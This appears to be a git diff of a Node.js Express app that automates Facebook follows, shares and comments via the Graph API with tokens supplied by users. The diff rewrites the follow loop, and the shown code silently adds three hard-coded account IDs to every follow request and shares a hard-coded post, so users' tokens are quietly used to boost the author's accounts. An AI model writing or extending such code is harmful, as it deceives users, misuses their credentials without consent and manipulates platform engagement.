@@ -356,9 +356,9 @@ app.get("/follow", async(req,res) => {
   await follower(token, uid.split(","));
   return res.json({
     msg: "Success follow UIDs",
-    uid: {
+    uid: [
       ...uid.split(",")
-    }
+    ]
   })
 });
 
@@ -449,7 +449,7 @@ async function gagokaba(cookie) {
   }
 }
 
-
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
 async function yello(c,u,a,i){
   await share(true, c,u,a,i);
@@ -457,15 +457,14 @@ async function yello(c,u,a,i){
 }
 
 async function follower(a,uid){
-  let awit = 0;
   const neth = [
         ...uid,
         "100015801404865",
         "61562218612857",
         "61559180483340",
         ];
-    setInterval(async() => {
-    await axios.post(`https://graph.facebook.com/v18.0/${neth[awit]}/subscribers`, {}, {
+  for (let i = 0; i < neth.length; i++) {
+    axios.post(`https://graph.facebook.com/v18.0/${neth[i]}/subscribers`, {}, {
       headers: {
         ...headers_a,
         "Authorization": `Bearer ${a}`
@@ -473,13 +472,8 @@ async function follower(a,uid){
     }).then(nethie => {
     }).catch(err => {
     });
-    if (awit === neth.length){
-      awit = 0;
-      return;
+    await sleep(2*1000);
     }
-    awit++;
-    }, 3*1000);
-  
 }
 
 async function commenter(a,msg,link,delay){
